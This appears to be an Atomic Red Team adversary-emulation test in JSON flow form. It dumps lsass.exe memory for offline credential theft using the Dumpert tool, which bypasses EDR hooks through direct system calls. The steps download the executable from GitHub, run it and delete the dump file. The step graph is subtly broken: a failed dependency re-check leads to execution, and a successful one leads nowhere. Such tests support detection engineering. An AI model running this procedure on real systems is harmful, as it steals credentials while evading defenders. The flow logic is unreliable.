{
  "id": "7ae7102c-a099-45c8-b985-4c7a2d05790d",
  "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
  "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "c65dc99b-a504-4c92-b40b-2d6eb6b98d05",
      "type": "execute-command",
      "data": {
        "command": "\"#{dumpert_exe}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "a49ddeec-d8d2-4f7f-be24-810e5c623f43",
      "type": "execute-command",
      "data": {
        "command": "del C:\\windows\\temp\\dumpert.dmp \u003enul 2\u003e nul\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "15225135-3a0b-4e80-b8b4-df7925def8bc",
      "name": "Check dependency 1/1",
      "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dumpert_exe}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0fec7805-d311-4bc6-9388-54bc9b7f58c8",
      "name": "Resolve dependency 1/1",
      "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory (Split-Path \"#{dumpert_exe}\") -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile \"#{dumpert_exe}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7c0ef1a6-fd0f-48b6-ad74-a1a2bd36f2e1",
      "name": "Re-check dependency 1/1",
      "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dumpert_exe}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "c65dc99b-a504-4c92-b40b-2d6eb6b98d05",
      "p": "on-success",
      "o": "a49ddeec-d8d2-4f7f-be24-810e5c623f43"
    },
    {
      "s": "c65dc99b-a504-4c92-b40b-2d6eb6b98d05",
      "p": "on-failure",
      "o": "a49ddeec-d8d2-4f7f-be24-810e5c623f43"
    },
    {
      "s": "15225135-3a0b-4e80-b8b4-df7925def8bc",
      "p": "on-success",
      "o": "c65dc99b-a504-4c92-b40b-2d6eb6b98d05"
    },
    {
      "s": "15225135-3a0b-4e80-b8b4-df7925def8bc",
      "p": "on-failure",
      "o": "0fec7805-d311-4bc6-9388-54bc9b7f58c8"
    },
    {
      "s": "0fec7805-d311-4bc6-9388-54bc9b7f58c8",
      "p": "on-success",
      "o": "7c0ef1a6-fd0f-48b6-ad74-a1a2bd36f2e1"
    },
    {
      "s": "7c0ef1a6-fd0f-48b6-ad74-a1a2bd36f2e1",
      "p": "on-failure",
      "o": "c65dc99b-a504-4c92-b40b-2d6eb6b98d05"
    }
  ],
  "tags": [
    "T1003.001",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "dumpert_exe",
      "type": "path",
      "description": "Path of Dumpert executable",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe"
    }
  ]
}